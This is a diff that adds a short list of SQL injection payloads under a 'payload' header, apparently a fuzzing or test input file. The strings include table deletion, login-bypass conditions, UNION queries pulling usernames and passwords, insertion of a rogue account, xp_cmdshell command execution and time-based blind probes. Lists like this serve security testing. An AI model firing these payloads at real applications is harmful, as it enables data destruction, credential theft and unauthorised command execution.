@@ -1,0 +1,12 @@
+payload
+'; DROP TABLE users; --
+' OR '1'='1
+' UNION SELECT * FROM users --
+admin'--
+1' OR '1'='1'--
+'; INSERT INTO users VALUES ('hacker', 'password'); --
+' OR 1=1--
+' UNION SELECT username,password FROM users--
+'; EXEC xp_cmdshell('dir'); --
+' OR 'x'='x
+'; WAITFOR DELAY '00:00:05'--
